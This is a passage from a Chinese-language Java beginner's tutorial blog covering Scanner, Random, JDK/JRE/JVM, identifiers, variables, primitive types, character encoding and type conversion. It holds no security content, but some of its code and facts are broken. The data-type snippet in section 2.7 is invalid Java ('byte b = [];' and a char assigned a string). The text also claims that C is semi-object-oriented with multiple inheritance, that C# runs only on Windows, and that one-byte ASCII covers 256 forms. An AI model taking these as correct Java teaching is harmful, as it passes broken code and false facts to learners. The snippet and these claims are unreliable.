href="#1-8-Scanner" class="headerlink" title="1.8 - Scanner"></a>1.8 - Scanner</h3><h4 id="1-8-1-基本概念"><a href="#1-8-1-基本概念" class="headerlink" title="1.8.1 - 基本概念"></a>1.8.1 - 基本概念</h4><pre><code class="hljs">一个简单的文本扫描器，用final修饰的，表示该类不可被继承</code></pre><h4 id="1-8-2-基本使用"><a href="#1-8-2-基本使用" class="headerlink" title="1.8.2 - 基本使用"></a>1.8.2 - 基本使用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Scanner文本扫描器</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<span class="hljs-comment">//构造扫描器对象</span><br><br><span class="hljs-comment">//        System.out.println(&quot;请输入整数类型的数据：&quot;);</span><br><span class="hljs-comment">//        System.out.println(sc.nextInt() + &quot;~~~&quot;);</span><br><br><span class="hljs-comment">//        System.out.println(&quot;请输入float类型的数据：&quot;);</span><br><span class="hljs-comment">//        System.out.println(sc.nextFloat());</span><br><br><span class="hljs-comment">//        System.out.println(&quot;请输入boolean类型数据：&quot;);</span><br><span class="hljs-comment">//        System.out.println(sc.nextBoolean());</span><br><br><span class="hljs-comment">//        System.out.println(&quot;请输入一串字符串：&quot;);</span><br><span class="hljs-comment">//        //当读取到有效字符后才可以结束输入，空格和回车会自动忽略</span><br><span class="hljs-comment">//        System.out.println(sc.next());</span><br><br>        <span class="hljs-comment">//以Enter键为结束符，可以识别空格</span><br>        System.out.println(<span class="hljs-string">&quot;请输入一串字符串：&quot;</span>);<br>        System.out.println(sc.nextLine());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-9-Random"><a href="#1-9-Random" class="headerlink" title="1.9 - Random"></a>1.9 - Random</h3><h4 id="1-9-1-基本概念"><a href="#1-9-1-基本概念" class="headerlink" title="1.9.1 - 基本概念"></a>1.9.1 - 基本概念</h4><pre><code class="hljs">该类是Java中用来生成随机数的类。</code></pre><h4 id="1-9-2-基本引用"><a href="#1-9-2-基本引用" class="headerlink" title="1.9.2 - 基本引用"></a>1.9.2 - 基本引用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  Random随机类</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">ran</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<span class="hljs-comment">//创建随机类对象</span><br><br>        <span class="hljs-comment">//生成一个随机数,默认使用int类型的范围</span><br>        System.out.println(ran.nextInt());<br><br>        <span class="hljs-comment">//设置一个固定的范围,设置100则会在0 ~ 99之间选择一个数</span><br>        System.out.println(ran.nextInt(<span class="hljs-number">100</span>));<br><br>        <span class="hljs-comment">//返回浮点数类型的数据</span><br>        System.out.println(ran.nextDouble());<br>        System.out.println(ran.nextFloat());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
      <tag>Java常用类库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaSe基础---语法</title>
    <link href="/2020/05/01/JavaSe%E5%9F%BA%E7%A1%80---%E8%AF%AD%E6%B3%95/"/>
    <url>/2020/05/01/JavaSe%E5%9F%BA%E7%A1%80---%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h3 id="第1章Java语言概述"><a href="#第1章Java语言概述" class="headerlink" title="第1章Java语言概述"></a>第1章Java语言概述</h3><h4 id="1-1、java语言概述"><a href="#1-1、java语言概述" class="headerlink" title="1.1、java语言概述"></a>1.1、java语言概述</h4><ul><li>计算机语言：人与计算机之间进行信息交流沟通的一种特殊语言</li><li>Java语言：是美国Sun公司（Stanford University Network）在1995年推出的计算机语言</li><li>java之父：詹姆斯·高斯林（James Gosling）</li><li>重要事件：2009年，Sun公司被甲骨文公司收购，所以我们现在访问oracle官网即可：<a href="https://www.oracle.com/">https://www.oracle.com</a></li></ul><h4 id="1-2、java应用版本的区分"><a href="#1-2、java应用版本的区分" class="headerlink" title="1.2、java应用版本的区分"></a>1.2、java应用版本的区分</h4><ul><li><p>2005 年，Java 诞生十周年，从之前的J2SE&#x2F;J2EE&#x2F;J2ME 分别改名为：JaveSE&#x2F;JavaEE&#x2F;JavaME。</p></li><li><p>JavaSE 是Java 的标准版，是学习JavaEE 和JavaME 的基础，JavaEE 是企业版，JavaME 是微型版。</p></li><li><p>JavaSE：java基础语法+核心技术🤺</p></li><li><p>JavaEE：企业版</p></li><li><ul><li>为我们提供了13项技术规范，这些技术规范其中都包含了例如：Web开发，数据库，JDBC开发，邮件开发……但是实际项目开发中，JavaEE（企业版），我们根本就不用！！！因为Java的类库，不仅仅只是第一方强大，很多第三方提供的类库更加的强大。如果说要使用JavaEE的类库，我们只学习使用两项规范。分别是servlet规范，以及jsp规范。</li></ul></li><li><p>JavaME：微型版、游戏版  —&gt;现在早就已经过时了</p></li><li><p>Java版本划分：</p></li><li><p>JavaSE 标准版 Java核心技术 必学</p></li><li><p>JavaEE 企业版 13项技术规范 servlet jsp</p></li><li><p>JavaME 微型版&#x2F;游戏版  过时了 肯定不用</p></li></ul><h4 id="1-3、java语言特性"><a href="#1-3、java语言特性" class="headerlink" title="1.3、java语言特性"></a>1.3、java语言特性</h4><ul><li><p><strong>简单性（相对于C和C++）</strong>：Java 语言底层采用C语言实现，相对于C来说，Java 是简单的，在Java语言中程序员不需要再操作复杂的指针（指针的操作是很复杂的），继承方面也是只支持单继承（C语言是一种半面向对象的编程语言，支持多继承，多继承会导致关系很复杂），在很多方面进行了简化。</p></li><li><p><strong>面向对象</strong>：Java 中提供了<strong>封装、继承、多态</strong>的面向对象机制。</p></li><li><p><strong>健壮性：<strong>在C程序当中的无用数据&#x2F;垃圾数据需要编程人员手动释放，当忘记释放内存的时候，会导致内存使用率降低，影响程序的执行；在Java 语言当中这种问题得到了解决，因为Java 语言引入了</strong>自动垃圾回收机制（GC 机制）</strong>，Java 程序启动了一个单独的垃圾回收线程，时刻监测内存使用情况，在特定时机会回收&#x2F;释放垃圾数据，这样会让内存时刻处于最好的状态。</p></li><li><p>**多线程：**Java 语言支持多个线程同时并发执行，同时也提供了多线程环境下的安全机制。</p></li><li><p><strong>可移植性&#x2F;跨平台：</strong></p><ul><li><p>a. 平台：指的是操作系统</p><ul><li>Windows</li><li>MacOS</li><li>Linux</li></ul></li><li><p>b. 跨平台</p><ul><li>Java程序不需要进行任何修改，就可以在任意操作系统上运行。（注意：不是所有语言都具备这样的特征。例如C#只能在Windows上运行）</li></ul></li><li><p>c. 实现跨平台的原理</p></li></ul></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181038055.png"></p><p>编写的Java代码并不是直接运行在操作系统当中的。而是运行在操作系统安装的JVM虚拟机中。每一个操作系统都会对应各自版本的JVM虚拟机</p></li></ul><h4 id="1-4、JDK、JRE、JVM-三者关系"><a href="#1-4、JDK、JRE、JVM-三者关系" class="headerlink" title="1.4、JDK、JRE、JVM 三者关系"></a>1.4、JDK、JRE、JVM 三者关系</h4><ul><li><p>JDK：JDK（Java Development Kit） 是 Java 语言的软件开发工具包（SDK）。它是每一个 Java 软件开发人员必须安装的。JDK 安装之后，它会自带一个 JRE，因为软件开发人员编写完代码之后总是要运行的。</p></li><li><p>JRE：JRE（Java Runtime Environment，Java 运行环境），运行JAVA 程序所必须的环境的集合，包含JVM 标准实现及Java 核心类库。</p><ul><li>JVM：JVM 是Java Virtual Machine（Java 虚拟机）的缩写，JVM 是一种用于计算设备的规范，它是一个虚构出来的计算机，是通过在实际的计算机上仿真模拟各种计算机功能来实现的。JVM 是实现Java 语言跨平台的法宝。<ul><li>如下图所示：</li></ul></li></ul></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181112614.png"></p></li><li><p>JDK、JRE、JVM 之间存在这样的包含关系：JDK 包含JRE，JRE又包含JVM。换句话说，只要安装了JDK，JRE 和JVM 则自动就安装了。</p></li><li><p>JDK: Java开发工具包。做Java开发，必须安装，安装JDK，自带安装JRE</p></li><li><p>JRE: Java运行环境。JVM虚拟机 + Java核心类库</p></li><li><p>JVM：Java虚拟机，作用运行Java程序可实现跨平台</p></li></ul><h4 id="1-5、初步了解java的加载与执行"><a href="#1-5、初步了解java的加载与执行" class="headerlink" title="1.5、初步了解java的加载与执行"></a>1.5、初步了解java的加载与执行</h4><ul><li>在编写第一个 Java 程序之前，我们应当对 Java 的加载与执行提前有一个简单的了解<br>如图所示：<ul><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181105386.png"></li></ul></li></ul><h3 id="第2章Java基础语法"><a href="#第2章Java基础语法" class="headerlink" title="第2章Java基础语法"></a>第2章Java基础语法</h3><h4 id="2-1、注释"><a href="#2-1、注释" class="headerlink" title="2.1、注释"></a>2.1、注释</h4><ul><li><p>作用：解释说明，在程序中不运行，增加程序的可读性</p></li><li><p>注释的分类：</p><ul><li><p>(1) 单行注释 &#x2F;&#x2F;</p></li><li><p>(2) 多行注释 &#x2F;  注释内容  &#x2F;</p></li><li><p>(3) 文档注释 &#x2F;** 注释内容 *&#x2F;</p></li></ul></li></ul><h4 id="2-2、关键字"><a href="#2-2、关键字" class="headerlink" title="2.2、关键字"></a>2.2、关键字</h4><ul><li><p>（1）关键字在Java中具有一定特殊含义，全部小写，如：class  public   static  void ………</p></li><li><p>（2）注意：在EditPlus中，编写Java源文件时没有更改主题，则蓝色的字体都是Java中的关键字</p></li><li><p>（3）Java中的关键字，如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181133527.png"></p></li></ul><h4 id="2-3、标识符"><a href="#2-3、标识符" class="headerlink" title="2.3、标识符"></a>2.3、标识符</h4><ul><li><p>标识符就是名字，对类名、变量名称、方法名称、参数名等修饰</p></li><li><p>标识符的命名规则：</p><ul><li>标识符可以由字母，数字，下划线(_) ， 美元符($)构成 （注意中文标识符）</li><li>数字不能开头</li><li>区分大小写</li><li>不能使用关键字</li><li>注意：以上几点需要大家在以后不断的练习中进行掌握，不需要死记硬背</li></ul></li><li><p>标识符的命名规范：</p><ul><li>建议：标识符<strong>见名知意</strong>，也就是编写单词，如：name  age</li><li>建议：<strong>类名每个单词首字母大写</strong>，如：HelloWorld  Homework  Student</li><li>建议：<strong>使用驼峰命名规则</strong></li><li>建议：比较长的单词也可以适当以缩写形式呈现（没有具体规则）</li><li>注意：中文的标识符是可以使用的，<strong>但是开发中千万不要使用中文的标识符</strong>。</li></ul></li></ul><h4 id="2-4、变量"><a href="#2-4、变量" class="headerlink" title="2.4、变量"></a>2.4、变量</h4><h5 id="2-4-1、字面量"><a href="#2-4-1、字面量" class="headerlink" title="2.4.1、字面量"></a>2.4.1、字面量</h5><ul><li>字面量就是数据（文字信息&#x2F;数值等 都是数据）例如：1234，true，”abc”，”你好”，3.14都是数据。在现实生活中每天都会接触到数据，例如：你今天的体重是 86Kg，你今天花了 500 元，买了个西瓜重量是8.6Kg，外面明明是晴天，你却说狂风暴雨，你说的是假话（false）。<br>以上这些具体的数据就是字面量。</li></ul><h5 id="2-4-2、变量"><a href="#2-4-2、变量" class="headerlink" title="2.4.2、变量"></a>2.4.2、变量</h5><ul><li><p>变量：</p><ul><li>变量是用来存放以上字面量的容器</li><li>存放的数据是可以改变的，所以叫变量</li></ul></li><li><p>变量的操作步骤</p></li><li><p>优化变量的操作步骤</p></li><li><p>常用的数据类型:</p><ul><li><p>整数类型int</p></li><li><p>浮点类型double</p></li><li><p>字符串类型String</p></li></ul></li></ul><h5 id="2-4-3、变量的分类"><a href="#2-4-3、变量的分类" class="headerlink" title="2.4.3、变量的分类"></a>2.4.3、变量的分类</h5><ul><li>变量按声明的位置(作用范围)分为：<ul><li>局部变量：在方法中声明的</li><li>成员变量：在方法外声明的，也就是在类中声明的变量。例如：</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">18</span>; <span class="hljs-comment">// 对于整个java文件来说这是一个全局变量</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span>&#123;  <span class="hljs-comment">// 这是一个类</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// 对于这个类来说，这是一个全局变量</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>&#123;  <span class="hljs-comment">// 这是一个方法</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>; <span class="hljs-comment">// 对于这个类中的hello方法来说这是一个局部变量</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>变量按数据类型分为：<ul><li>基本数据类型变量：在内存中存放真正的值，如：int、double、char……..</li><li>引用数据类型变量：在内存中存放的是地址，如：String…</li></ul></li></ul><h4 id="2-5、基本数据类型"><a href="#2-5、基本数据类型" class="headerlink" title="2.5、基本数据类型"></a>2.5、基本数据类型</h4><h4 id="2-5-1、基本数据类型概述"><a href="#2-5-1、基本数据类型概述" class="headerlink" title="2.5.1、基本数据类型概述"></a>2.5.1、基本数据类型概述</h4><p>java中的数据类型包括两大类：一类是基本数据类型，一类是引用数据类型，基本数据类型又包括：</p><ul><li>整数型：byte，short，int，long</li><li>浮点型：float，double</li><li>字符型：char</li><li>布尔型：boolean</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301181133527.png"></p><ul><li><p>补充：计算机存储的是二进制信息，也就是0和1（日常生活中使用十进制0—-9）计算机中以字节为单位存储和解释信息,规定一个字节由八个二进制位构成。</p></li><li><p>计算机存储单位：</p><ul><li><p>8bit（位）———————— &gt;1byte</p></li><li><p>1024byte —————- &gt;1KB</p></li><li><p>1024KB —————— &gt;1MB</p></li><li><p>1024MB —————– &gt;1GB</p></li><li><p>1024GB —————— &gt;1TB</p></li><li><p>PB、EB、ZB、YB、BB、NB、DB、CB…</p></li></ul></li></ul><h4 id="2-6、字符编码"><a href="#2-6、字符编码" class="headerlink" title="2.6、字符编码"></a>2.6、字符编码</h4><ul><li>对于以上的八种基本数据类型来说，其中七种类型 byte,short,int,long,float,double,boolean计算机表示起来是很容易的，因为这七种类型底层直接就是数字，十进制的数字和二进制之间有固定的转换规则，所以计算机可直接表示和处理。但是大家别忘了，除了以上的七种数据类型之外，还有一种类型叫做字符型char，这个对于计算机来说表示起来就不是那么容易了，因为字符毕竟是现实世界当中的文字，而文字每个国家又是不同的。</li><li>最初的时候美国标准协会制定了ASCII 码，ASCII 码采用1 个字节编码，1 个字节可以表示256 种不同的形式（前面说过了），对于英文来说这个足够了，因为英文单词就是由26 个英文字母拼凑而成，大小写全部才52 个，再加上数字和标点符号也不会超过256 个。但ASCII 码对于中文来说那就不够了，因为汉字不止256个。<br>常见的 ASCII 码需要大家能够记住几个，在 ASCII 码中规定<br><strong>‘a’对应 97，’b’对应98，以此类推，’A’对应65，’B’对应66</strong>，以此类推，<strong>‘0’字符对应48，’1’字符对应49</strong>。</li><li>在字符编码当中，有这样两个常见的术语需要大家了解一下：编码和解码，它们都是什么，我们拿字符’a’来解释一下：’**a’是97，97 对应的二进制是01100001，那么从’a’到二进制01100001的转换过程称为编码，从二进制 01100001 到’a’的转换过程称为解码。**大家一定要注意：编码和解码要采用同一种字符编码方式（要采用同一个对照表），不然会出现乱码。这也是乱码出现的本质原因。</li><li>在上世纪90 年代初，国际组织制定了一种字符编码方式，叫做Unicode 编码，这种编码方式统一了全球所有国家的文字，具体的实现包括：UTF-8，UTF-16，UTF-32 等。Java 为了国际化，为了支持所有国家的语言，所以Java 采用的编码方式为Unicode 编码。例如字符’中’对应的 Unicode 码是’\u4e2d’。在实际开发中几乎所有的团队都会使用 Unicode 编码方式，因为这种方式更通用，兼容性更好。Java 采用 unicode 编码，目前在实际的开发中大部分团队都会选择UTF-8 的编码方式。</li></ul><h4 id="2-7、数据类型"><a href="#2-7、数据类型" class="headerlink" title="2.7、数据类型"></a>2.7、数据类型</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> [];<br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-type">char</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">title</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;这是我的第一篇文章&quot;</span>;<br><span class="hljs-type">double</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">3.13</span>;<br></code></pre></td></tr></table></figure><ul><li><p>基本数据类型之间是存在固定的转换规则的，现总结出以下6 条规则，无论是哪个程序，将这6 个规则套用进去，问题迎刃而解：</p></li><li><ul><li>八种基本数据类型中，除boolean 类型不能转换，剩下七种类型之间都可以进行转换；如果整数型字面量没有超出 byte,short,char 的取值范围，可以直接将其赋值给byte,short,char 类型的变量；</li><li>小容量向大容量转换称为自动类型转换，容量（以及转换规则）从小到大的排序为：byte &lt; short(char) &lt; int &lt; long &lt; float &lt; double，其中short 和char 都占用两个字节，但是char 可以表示更大的正整数；</li><li>大容量转换成小容量，称为强制类型转换，编写时必须添加“强制类型转换符”（类型），但运行时可能出现精度损失，谨慎使用；</li><li>byte,short,char 类型混合运算时，先各自转换成int 类型再做运算；未来的实际项目开发，不会出现byte，short，char的混合运算，对于整型的计算，一般我们直接将变量的类型声明为int就可以了，如果需求分析中确定int不够用，我们会使用long类型。</li><li>多种数据类型混合运算，各自先转换成容量最大的那一种再做运算。</li></ul></li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaSe</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
